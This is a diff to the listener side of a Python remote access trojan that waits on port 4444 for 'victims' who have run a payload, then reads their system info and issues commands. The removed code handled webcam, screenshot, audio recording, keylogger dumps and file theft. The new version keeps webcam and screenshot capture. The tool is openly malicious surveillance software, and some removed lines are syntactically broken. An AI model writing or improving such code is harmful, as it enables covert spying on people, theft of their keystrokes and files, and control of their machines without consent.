@@ -11,62 +11,36 @@ def save_file(content, filename):
 def start_listener():
     s = socket.socket()
     s.bind(('0.0.0.0', 4444))
-    s.listen(5)
-    print("[*] Waiting for victims... (Run payload.exe on targets)")
+    s.listen(1)
+    print("[*] Waiting for victim... (Run payload.exe on target)")
+    conn, addr = s.accept()
+    print(f"[+] Connected to {addr[0]}")
+    
+    # Show initial system info
+    sysinfo = json.loads(conn.recv(65535).decode())
+    print("\n=== SYSTEM INFO ===")
+    print(json.dumps(sysinfo, indent=4))
     
     while True:
-        conn, addr = s.accept()
-        print(f"\n[+] Connection from {{addr[0]}}")
-        
-        # Show initial system info
-        try:
-            sysinfo = json.loads(conn.recv(999999).decode())
-            print("=== SYSTEM INFO ===")
-            print(json.dumps(sysinfo, indent=4))
-        except:
-            print("[-] Could not receive system info")
-        
-        while True:
-            cmd = input("RAT> ")
-            if not cmd:
-                continue
-                
-            conn.send(cmd.encode())
+        cmd = input("\nRAT> ").strip()
+        if not cmd:
+            continue
             
-            if cmd.lower() == "exit":
-                conn.close()
-                break
-                
-            try:
-                data = conn.recv(9999999).decode()
-                
-                if cmd == "webcam":
-                    save_file(data, f"webcam_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.jpg")
-                    print("[+] Webcam saved")
-                elif cmd == "screenshot":
-                    save_file(data, f"screen_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png")
-                    print("[+] Screenshot saved")
-                elif cmd == "record_audio":
-                    save_file(data, f"audio_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.wav")
-                    print("[+] Audio recording saved")
-                elif cmd == "keylogger_dump":
-                    logs = json.loads(data)
-                    print("[+] Keylogs:")
-                    for log in logs:
-                        print(log)
-                elif cmd.startswith("download "):
-                    filename = input("Save as (press Enter for original name): ")
-                    if not filename:
-                        filename = cmd[9:].split("\")[-1]")
-                    save_file(data, filename)
-                    print(f"[+] Saved as {{filename}}")
-                elif cmd.startswith("list_files "):
-                    print("Files:", ", ".join(json.loads(data)))
-                else:
-                    print(data)
-            except:
-                print("[-] Connection lost")
-                break
+        conn.send(cmd.encode())
+        
+        if cmd.lower() == "exit":
+            break
+            
+        data = conn.recv(10485760).decode()  # 10MB max
+        
+        if cmd == "webcam":
+            save_file(data, f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
+            print("[+] Webcam saved")
+        elif cmd == "screenshot":
+            save_file(data, f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
+            print("[+] Screenshot saved")
+        else:
+            print(data)
 
 if __name__ == "__main__":
     start_listener()
